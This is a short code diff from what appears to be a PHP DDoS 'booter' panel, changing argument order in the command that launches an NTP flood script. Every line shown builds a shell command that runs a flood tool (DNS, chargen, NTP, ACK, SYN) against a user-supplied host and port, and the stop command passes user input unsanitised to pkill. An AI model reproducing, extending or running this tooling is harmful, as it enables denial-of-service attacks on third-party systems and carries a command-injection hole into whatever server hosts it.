@@ -67,7 +67,7 @@ die('Error: Port is not in numeric form!');}
 // Commands that send to server
 if ($method == "dns") { $command = "cd News; ./zap $host $port 2 -1 $time"; }
 if ($method == "chargen") { $command = "./chargen $host $port chargen.txt 2 -1 $time"; }
-if ($method == "ntp") { $command = "perl weed.pl $host $port $time 1024"; }
+if ($method == "ntp") { $command = "perl weed.pl $host $port 1024 $time"; }
 if ($method == "ack") { $command = "./ack $host $port ack.txt 2 -1 $time"; }
 if ($method == "syn") { $command = "./syn $host $port syn.txt 2 -1 $time"; }
 if ($action == "stop") { $command = "pkill $host -f"; }
